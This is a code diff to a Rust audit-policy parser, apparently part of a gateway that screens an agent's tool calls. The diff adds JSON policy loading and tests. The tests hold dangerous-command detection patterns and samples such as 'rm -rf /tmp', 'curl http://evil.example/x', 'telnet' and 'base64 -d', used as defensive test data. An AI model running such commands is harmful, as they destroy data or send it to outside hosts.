@@ -2,7 +2,7 @@
 
 use {
     crate::{
-        config::{AuditMode, Config},
+        config::{AuditMode, Config, custom_file::strip_yaml_quotes},
         error::{Result, VeilError},
     },
     std::{collections::HashMap, path::Path},
@@ -40,7 +40,12 @@ pub struct DangerRule {
 }
 
 impl AuditPolicy {
-    pub fn default_policy() -> Self { Self::default() }
+    pub fn default_policy() -> Self {
+        Self {
+            internal_suffixes: vec![".corp.example".to_string()],
+            ..Self::default()
+        }
+    }
 
     /// 启动期 fail-fast 加载（`POL-1`）：`load_from_file` 的 `VeilError::Config`
     /// 原样上抛（不可读/未知键/孤立列表项/非法 `mode`/无法解析行/列表段形态错误），
@@ -51,41 +56,84 @@ impl AuditPolicy {
         Ok(policy)
     }
 
-    /// `POL-2`/D2：把最终生效模式写回运行时配置（env 显式含 `AUDIT_ENABLED` 回退 > 文件 `mode` >
-    /// `off`）， 使文件 `mode` 实际生效并被请求路径（`state.config.audit_mode`）读取。
+    /// `POL-2`/D2：生效模式写回运行时配置（env 显式 > 文件 `mode` > `off`）。
     pub fn apply_effective_mode(&self, config: &mut Config) {
         let env_explicit = config.audit_mode_explicit.then_some(config.audit_mode);
         config.audit_mode = resolve_effective_mode(env_explicit, self.mode);
     }
 
-    /// 捕获进程 env 快照（`HOME` 单列 + 全量 env）：唯一触碰进程环境的注入
-    /// 边界，纯判定只读字段。测试以空/定制快照构造确定性用例。
+    /// 捕获进程 env 快照（`HOME` 单列 + 全量 env）：唯一触碰进程环境的注入边界。
     pub fn capture_process_env(&mut self) {
         self.home = std::env::var("HOME").ok();
         self.env = std::env::vars().collect();
     }
 
-    /// 从 `AUDIT_POLICY_FILE` 加载；`None`/空表示默认策略。
-    /// 非法文件返回 [`VeilError::Config`]（启动报错）。
+    /// 从 `AUDIT_POLICY_FILE` 加载；`None`/空表示默认策略，非法文件返回 [`VeilError::Config`]。
     pub fn load_from_file(path: Option<&Path>) -> Result<Self> {
-        let Some(p) = path else {
-            return Ok(Self::default());
+        let Some(p) = path.filter(|p| !p.as_os_str().is_empty()) else {
+            return Ok(Self::default_policy());
         };
-        if p.as_os_str().is_empty() {
-            return Ok(Self::default());
-        }
         let text = std::fs::read_to_string(p).map_err(|e| VeilError::Config {
             var: "AUDIT_POLICY_FILE".to_string(),
             message: format!("审计策略文件不可读 {}: {e}", p.display()),
         })?;
+        if text.trim_start().starts_with('{') {
+            return Self::parse_json_policy(&text);
+        }
         Self::parse_minimal_yaml(&text)
+    }
+
+    /// APP-3/D17：顶层 JSON 对象策略（与 YAML mapping 同解析、字段集合一致，
+    /// 对照 Python `_audit.py:222-234`），fail-closed 语义不变——未知键、类型
+    /// 不符、非法 `mode`、无法解析一律拒启动，不降级默认策略。
+    fn parse_json_policy(text: &str) -> Result<Self> {
+        let value: serde_json::Value =
+            serde_json::from_str(text).map_err(|e| VeilError::Config {
+                var: "AUDIT_POLICY_FILE".to_string(),
+                message: format!("审计策略文件 JSON 解析失败: {e}"),
+            })?;
+        let obj = value.as_object().ok_or_else(|| VeilError::Config {
+            var: "AUDIT_POLICY_FILE".to_string(),
+            message: "审计策略文件顶层须为 JSON 对象".to_string(),
+        })?;
+        let mut policy = Self::default_policy();
+        for (key, val) in obj {
+            match key.as_str() {
+                "allow" => policy.allow = json_string_list(val, key)?,
+                "deny" => policy.deny = json_string_list(val, key)?,
+                "internal_suffixes" => {
+                    policy.internal_suffixes = json_string_list(val, key)?
+                        .into_iter()
+                        .map(|s| s.to_lowercase())
+                        .collect();
+                }
+                "extra_block_substrings" => {
+                    policy.extra_block_substrings = json_string_list(val, key)?
+                        .into_iter()
+                        .map(|s| s.to_lowercase())
+                        .collect();
+                }
+                "extra_sensitive_paths" => {
+                    policy.extra_sensitive_paths = json_string_list(val, key)?;
+                }
+                "mode" => policy.mode = json_mode(val)?,
+                "dangerous" => policy.extra_dangerous = json_dangerous(val)?,
+                other => {
+                    return Err(VeilError::Config {
+                        var: "AUDIT_POLICY_FILE".to_string(),
+                        message: format!("审计策略文件未知键 {other:?}"),
+                    });
+                }
+            }
+        }
+        Ok(policy)
     }
 
     /// 极简 YAML 子集解析（避免引入 yaml 重依赖）：
     /// 支持 `key: value` 与 `key:` + `- item` 列表；未知键忽略。
     /// `dangerous` 项兼容字符串形与对象形（`{pattern, reason, network}`）。
     fn parse_minimal_yaml(text: &str) -> Result<Self> {
-        let mut policy = Self::default();
+        let mut policy = Self::default_policy();
         let mut section: Option<String> = None;
         let mut pending_dangerous: Option<DangerRule> = None;
         for (lineno, raw) in text.lines().enumerate() {
@@ -95,7 +143,7 @@ impl AuditPolicy {
             }
             if let Some(item) = line.strip_prefix("- ") {
                 flush_dangerous(&mut policy, &mut pending_dangerous);
-                let item = unquote(item.trim());
+                let item = strip_yaml_quotes(item.trim());
                 if item.is_empty() {
                     continue;
                 }
@@ -163,16 +211,16 @@ impl AuditPolicy {
                 && let Some(rule) = pending_dangerous.as_mut()
                 && let Some((k, v)) = line.split_once(':')
             {
-                let key = unquote(k.trim());
+                let key = strip_yaml_quotes(k.trim());
                 if is_dangerous_field(&key) && !v.trim().is_empty() {
-                    set_dangerous_field(rule, &key, &unquote(v.trim()));
+                    set_dangerous_field(rule, &key, &strip_yaml_quotes(v.trim()));
                     continue;
                 }
             }
             flush_dangerous(&mut policy, &mut pending_dangerous);
             if let Some((k, v)) = line.split_once(':') {
                 let key = k.trim().to_string();
-                let val = unquote(v.trim());
+                let val = strip_yaml_quotes(v.trim());
                 match key.as_str() {
                     "extra_block_substrings"
                     | "extra_sensitive_paths"
@@ -188,6 +236,9 @@ impl AuditPolicy {
                                     lineno + 1
                                 ),
                             });
+                        }
+                        if key == "internal_suffixes" {
+                            policy.internal_suffixes.clear();
                         }
                         section = Some(key);
                     }
@@ -282,9 +333,9 @@ fn set_dangerous_field(rule: &mut DangerRule, key: &str, value: &str) {
 
 fn object_field(item: &str) -> Option<(String, String)> {
     let (k, v) = item.split_once(':')?;
-    let key = unquote(k.trim());
+    let key = strip_yaml_quotes(k.trim());
     if is_dangerous_field(&key) && !v.trim().is_empty() {
-        Some((key, unquote(v.trim())))
+        Some((key, strip_yaml_quotes(v.trim())))
     } else {
         None
     }
@@ -325,9 +376,9 @@ fn parse_dangerous_object(item: &str) -> Option<DangerRule> {
         let Some((k, v)) = pair.split_once(':') else {
             continue;
         };
-        let key = unquote(k.trim());
+        let key = strip_yaml_quotes(k.trim());
         if is_dangerous_field(&key) {
-            set_dangerous_field(&mut rule, &key, &unquote(v.trim()));
+            set_dangerous_field(&mut rule, &key, &strip_yaml_quotes(v.trim()));
         }
     }
     if rule.pattern.is_empty() {
@@ -337,15 +388,96 @@ fn parse_dangerous_object(item: &str) -> Option<DangerRule> {
     }
 }
 
-fn unquote(s: &str) -> String {
-    let s = s.trim();
-    if s.len() >= 2
-        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
-    {
-        s[1..s.len() - 1].to_string()
-    } else {
-        s.to_string()
+fn policy_config_err(message: String) -> VeilError {
+    VeilError::Config {
+        var: "AUDIT_POLICY_FILE".to_string(),
+        message,
     }
+}
+
+fn json_string_list(v: &serde_json::Value, key: &str) -> Result<Vec<String>> {
+    let arr = v
+        .as_array()
+        .ok_or_else(|| policy_config_err(format!("审计策略文件 [{key}] 须为数组")))?;
+    arr.iter()
+        .map(|item| {
+            item.as_str()
+                .map(str::to_string)
+                .ok_or_else(|| policy_config_err(format!("审计策略文件 [{key}] 数组项须为字符串")))
+        })
+        .collect()
+}
+
+fn json_mode(v: &serde_json::Value) -> Result<Option<AuditMode>> {
+    let Some(s) = v.as_str() else {
+        return Err(policy_config_err(
+            "审计策略文件 mode 须为字符串".to_string(),
+        ));
+    };
+    match s {
+        "off" => Ok(Some(AuditMode::Off)),
+        "block" => Ok(Some(AuditMode::Block)),
+        "approve" => Ok(Some(AuditMode::Approve)),
+        "" => Ok(None),
+        _ => Err(policy_config_err(format!(
+            "审计策略文件 mode 非法 {s:?}（取值 off/block/approve）"
+        ))),
+    }
+}
+
+fn json_dangerous(v: &serde_json::Value) -> Result<Vec<DangerRule>> {
+    let arr = v
+        .as_array()
+        .ok_or_else(|| policy_config_err("审计策略文件 [dangerous] 须为数组".to_string()))?;
+    let mut rules = Vec::new();
+    for item in arr {
+        if let Some(s) = item.as_str() {
+            let (pat, net) = match s.strip_suffix("[network]") {
+                Some(p) => (p.trim().to_string(), true),
+                None => (s.to_string(), false),
+            };
+            let (pat, reason) = match pat.split_once("=>") {
+                Some((p, r)) => (p.trim().to_string(), r.trim().to_string()),
+                None => (pat.clone(), pat.clone()),
+            };
+            if !pat.is_empty() {
+                rules.push(DangerRule {
+                    pattern: pat,
+                    reason,
+                    network: net,
+                });
+            }
+            continue;
+        }
+        if item.is_object() {
+            if let Some(rule) = parse_dangerous_value(item) {
+                rules.push(rule);
+            }
+            continue;
+        }
+        return Err(policy_config_err(
+            "审计策略文件 dangerous 项须为字符串或对象".to_string(),
+        ));
+    }
+    Ok(rules)
+}
+
+fn parse_dangerous_value(v: &serde_json::Value) -> Option<DangerRule> {
+    let pattern = v.get("pattern").and_then(|p| p.as_str())?.to_string();
+    if pattern.is_empty() {
+        return None;
+    }
+    let reason = v
+        .get("reason")
+        .and_then(|r| r.as_str())
+        .map(str::to_string)
+        .unwrap_or_else(|| pattern.clone());
+    let network = v.get("network").and_then(|n| n.as_bool()).unwrap_or(false);
+    Some(DangerRule {
+        pattern,
+        reason,
+        network,
+    })
 }
 
 #[cfg(test)]
@@ -606,5 +738,52 @@ dangerous:
         assert_eq!(p.extra_dangerous.len(), 1);
         assert_eq!(p.extra_dangerous[0].reason, "危险删除");
         assert!(is_dangerous("exec", "rm -rf /tmp", &p).is_some());
+    }
+
+    #[test]
+    fn policy_top_level_json() {
+        let text = r#"{"mode":"block","allow":["read_file"],"deny":["evil"],"internal_suffixes":[".Corp"],"extra_block_substrings":["RM -RF"],"dangerous":[{"pattern":"curl","reason":"网络外传","network":true}]}"#;
+        let p = AuditPolicy::parse_json_policy(text).unwrap();
+        assert_eq!(p.mode, Some(AuditMode::Block));
+        assert_eq!(p.allow, vec!["read_file"]);
+        assert_eq!(p.deny, vec!["evil"]);
+        assert_eq!(p.internal_suffixes, vec![".corp"], "后缀须小写归一");
+        assert_eq!(p.extra_block_substrings, vec!["rm -rf"], "子串须小写归一");
+        assert_eq!(p.extra_dangerous.len(), 1);
+        assert!(p.extra_dangerous[0].network);
+        assert!(is_dangerous("exec", "curl http://evil.example/x", &p).is_some());
+
+        // `load_from_file` 经 JSON 分支加载顶层对象。
+        let path = std::env::temp_dir().join(format!(
+            "veil-policy-json-{}-{}.json",
+            std::process::id(),
+            line!()
+        ));
+        std::fs::write(&path, text).unwrap();
+        let loaded = AuditPolicy::load_from_file(Some(&path)).unwrap();
+        std::fs::remove_file(&path).ok();
+        assert_eq!(loaded.mode, Some(AuditMode::Block));
+        assert_eq!(loaded.extra_dangerous.len(), 1);
+    }
+
+    #[test]
+    fn policy_json_dangerous_object() {
+        // 对象形 `dangerous` 可加载、`network` 缺省 false；字符串形与 `[network]` 兼容。
+        let p = AuditPolicy::parse_json_policy(
+            r#"{"dangerous":[{"pattern":"telnet","reason":"网络传输"},{"pattern":"rm -rf","reason":"删除","network":false},"base64 -d => 解码 [network]"]}"#,
+        )
+        .unwrap();
+        assert_eq!(p.extra_dangerous.len(), 3);
+        assert_eq!(p.extra_dangerous[0].pattern, "telnet");
+        assert!(!p.extra_dangerous[0].network, "network 缺省 false");
+        assert_eq!(p.extra_dangerous[1].reason, "删除");
+        assert_eq!(p.extra_dangerous[2].pattern, "base64 -d");
+        assert!(p.extra_dangerous[2].network);
+        // fail-closed：损坏 JSON / 未知键 / 类型不符均拒启动。
+        assert!(AuditPolicy::parse_json_policy("{ not json").is_err());
+        assert!(AuditPolicy::parse_json_policy(r#"{"unknown":1}"#).is_err());
+        assert!(AuditPolicy::parse_json_policy(r#"{"allow":"x"}"#).is_err());
+        assert!(AuditPolicy::parse_json_policy(r#"{"mode":"allow"}"#).is_err());
+        assert!(AuditPolicy::parse_json_policy(r#"[1,2]"#).is_err());
     }
 }
